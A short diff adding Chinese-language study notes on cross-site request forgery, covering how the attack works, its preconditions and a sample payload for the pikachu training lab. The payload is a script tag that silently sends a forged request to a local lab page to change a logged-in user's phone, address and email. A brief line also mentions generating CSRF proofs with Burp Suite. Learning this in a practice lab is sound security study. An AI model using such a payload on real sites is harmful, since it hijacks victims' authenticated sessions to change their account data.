@@ -1,0 +1,8 @@
+1.攻击者伪造一个请求，然后完成欺骗目标，在没有关闭主页面的情况下，用户进行点击，一旦点击这个请求，整个攻击就完成；
+2.攻击条件：有这个漏洞，用户已经登录，对协议包了解。浏览器支持，用户点击；
+3.pikachu靶场：
+<script 
+src='http://localhost/pika/vul/csrf/csrfget/csrf_get_edit.php?
+sex=gg&phonenum=1111&add=11111&email=111111&submit=submit'>
+</script>
+BP相关工具选项生成CSRF；
